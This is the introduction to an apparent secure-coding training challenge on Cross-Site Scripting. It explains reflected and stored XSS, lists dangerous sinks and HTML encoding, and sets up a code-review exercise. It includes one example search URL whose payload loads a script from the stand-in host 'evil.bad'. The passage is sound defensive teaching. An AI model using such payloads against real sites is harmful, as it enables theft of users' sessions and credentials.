JavaScript’s biggest foe is Cross-Site Scripting (abbreviated XSS). This type of attack occurs when a web page accepts input containing JavaScript from an untrusted source and renders it in the context of the page. It’s a form of code injection.

The target is the user identity. The server relies on authentication tokens and credentials to identify the user. The malicious script will extract this information from the browser and send it to a site the attacker controls (hence the name Cross-Site Scripting). The script makes it into the page via a specially crafted URL sent to the user (reflected XSS ) or by saving it into the site as an article or message (stored XSS).

Example URL with XSS payload:
    
    https://site.com/search.jsp?q='"/><script src="https://evil.bad/xss.js"></script>

#####Code Defenses Against Cross-Site Scripting

To prevent the attack the application must **neutralize the user input**. This means that the input will be inserted in the page without being rendered or executed. Most modern JavaScript frameworks such as **Angular** or **React** do this implicitly. 

In the Angular example below the `fullName` parameter is embeded in the link innerText, a safe context.

    <a class="nav-link"><span class="oi oi-account-logout"> Logout {{fullName}} </a>

However, sometimes you must extend the JavaScript framework by designing your own UI elements. When doing this you must keep in mind that the following page contexts are dangerous since they will execute input as JavaScript.

Dangerous HTML element attributes:

- innerHTML
- src
- onLoad, onClick, etc…

Dangerous functions:

- eval
- setTimeout
- setInterval

In the case of legacy web applications server side rendered code (JSP, PHP, ASPX) co-exists with modern pages and maintenance of the server side code may introduce new Cross-Site Scripting issues, if user input is not neutralized. In those cases HTML Encoding functions have to be called to turn hazardous HTML markup into safe strings.

`<` becomes `&lt;`

`>` becomes `&gt;`

`"` becomes `&quot;`

In this challenge you will take a look at a few samples to understand how to spot Cross-Site Scripting during code review. Select the code that prevents the vulnerability.

